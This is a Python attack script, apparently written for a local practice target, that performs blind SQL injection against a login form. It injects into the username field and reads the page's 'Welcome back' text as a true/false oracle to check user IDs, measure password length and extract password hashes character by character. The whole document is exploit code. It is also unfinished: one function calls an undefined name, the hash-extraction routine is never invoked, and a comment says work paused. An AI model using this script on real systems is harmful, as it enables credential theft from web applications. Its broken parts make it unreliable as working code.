#!/usr/bin/python

import requests

total_queries = 0
charset= "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    #perform injected query, identify if request was/n't valid
    global total_queries
    r= requests.post(target, data= {"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content
    
def boolean_query(offset, user_id, character, operator=">"):
    #determine if a char is valid or not
    payload = "(select hex(substr(password,{},1)) from user where id={}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    #is the user id valid or not
    payload = "(select id from user where id = {}) >=0".format(user_id)
    return injected_payload(payload)

def password_length(user_id):
    #identify the length of user's password
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i+= 1
        
def extract_hash(charset, user_id, password_length):
    #extract users password based on char set, thier id, and the length of a password
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_taken():
    #determine how many queries were made, reset at end
    global total_queries
    print("\t\t[!]  {} total queries!".format(total_queries))
    total_queries = 0
    
while True:
    try:
        user_id = input(">> enter a user ID to extract a password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
                

    #paused here, continue below
